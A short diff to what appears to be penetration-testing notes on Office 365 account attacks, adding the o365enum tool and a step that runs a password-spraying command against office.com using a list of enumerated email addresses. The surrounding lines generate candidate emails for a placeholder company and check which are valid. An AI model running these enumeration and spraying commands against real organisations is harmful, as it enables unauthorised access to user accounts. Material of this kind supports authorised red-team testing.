@@ -8,6 +8,8 @@ Tools:
 
 2) Oh365UserFinder https://github.com/dievus/Oh365UserFinder
 
+3) o365enum https://github.com/gremwell/o365enum
+
 ### 1) Generate wordlist
 
     username-anarchy USER NAME -@ @megacorp.com > emails.txt
@@ -15,6 +17,10 @@ Tools:
 ### 2) Identify valid email addresses
 
     python3 oh365userfinder.py -r emails.txt
+
+### 3) Start a password spraying attack
+
+    python3 o365enum.py -u emails.txt -p 'PASSWORD' -n 1 -m office.com
 
 ## Tenant Enumeration
 
